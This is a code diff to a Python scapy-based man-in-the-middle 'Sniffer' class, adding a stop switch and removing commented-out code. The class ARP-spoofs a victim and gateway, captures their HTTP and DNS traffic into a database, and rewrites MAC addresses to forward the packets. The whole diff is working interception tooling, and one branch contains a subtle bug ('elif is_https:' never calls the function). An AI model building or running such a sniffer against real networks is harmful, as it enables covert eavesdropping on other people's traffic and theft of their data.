@@ -26,16 +26,22 @@ class Sniffer:
         self.db.start()
         self.packets_lock = Lock()
         self.sendpac = True
+        self.on = True
 
     def start_spoofing(self):
-        self.spoofer.start()
+        if self.on:
+            self.spoofer.start()
 
     def all_filter(self,packet):
-        #return IP in packet and Raw in packet and ((TCP in packet and packet[TCP].sport != 443 and packet[TCP].dport != 443) or (UDP in packet and packet[UDP].dport != 443 and packet[UDP].sport != 443) or (UDP not in packet and TCP not in packet))
         return IP in packet and (DNS in packet or (TCP in packet and (packet[TCP].sport == 80 or packet[TCP].dport == 80) or (UDP in packet and (packet[UDP].sport == 80 or packet[UDP].dport == 80))))
 
     def sniff_all(self):
-        sniff(prn=self.navigate_packets)
+        sniff(prn=self.navigate_packets, stop_filter=lambda x: not self.on)
+        print("stopped")
+
+    def set_on(self, set):
+        if set=='stop':
+            self.on = False
 
     def navigate_packets(self, pack: packet):
         if self.all_filter(pack):
@@ -93,14 +99,10 @@ class Sniffer:
                 packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
                 packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
 
-
-            print("real sendpac: "+ str(self.sendpac))
             NOT_SENT.put(packet, self.packets-1)
-            if self.sendpac:
-                while not NOT_SENT.empty():
-                    print("here")
-                    pac = NOT_SENT.get()
-                    sendp(pac[0], verbose=False)
+            while self.sendpac and not NOT_SENT.empty():
+                pac = NOT_SENT.get()
+                sendp(pac[0], verbose=True)
 
     def check_rt(self, rt):
         for i in REQ_TYPES:
@@ -142,10 +144,7 @@ class Sniffer:
         # TODO: handle this
 
     def handle_packets_from_victim(self, pack):
-        #print("start h/p/v")
         if is_http(pack):
-            #self.db = DataBase()
-        #try:
             self.db.write_to_victim(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
                                     self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
             with self.packets_lock:
@@ -155,49 +154,18 @@ class Sniffer:
         elif DNS in pack:
             self.handle_dns(pack)
 
-        #except TypeError:
-            #print(TypeError)
-            #packet.show()
-
-        # fetchall returns list of tupples
-        #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
-
-        #param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
-         #             "src_port": None, "dst_port": None, "ttl": None}
-        #for key in param_dict:
-        #    param = input("enter: " + str(key) + ", if you don't want to press ENTER KEY:\n")
-         #   if (param != ''):
-          #      param_dict[key] = param
-        #self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"],
-         #                param_dict["req_params"], param_dict["data"], param_dict["src_port"], param_dict["dst_port"],
-          #               param_dict["ttl"])
-        #self.db.write_to_victim_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
-         #                               packet[TCP].sport, packet[TCP].dport)
         self.send_packet(pack)
 
     def handle_packets_from_router(self, pack):
-        #print("h/p/r")
         if is_http(pack):
-            #self.db = DataBase()
             self.db.write_to_router(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
                                     self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
-            # fetchall returns list of tupples
-            #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
             with self.packets_lock:
                 self.packets += 1
         elif is_https:
             self.handle_https(pack)
         elif DNS in pack:
             self.handle_dns(pack)
-        #param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
-        #              "src_port": None, "dst_port": None, "ttl": None}
-        #for key in param_dict:
-        #    param = input("enter: " + str(key) + ", if you don't want to press ENTER KEY:\n")
-        #    if (param != ''):
-        #        param_dict[key] = param
-        #self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"],
-        #                 param_dict["req_params"],
-        #                 param_dict["data"], param_dict["src_port"], param_dict["dst_port"], param_dict["ttl"])
-        #self.db.write_to_router_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
-        #                                packet[TCP].sport, packet[TCP].dport)
+
         self.send_packet(pack)
+
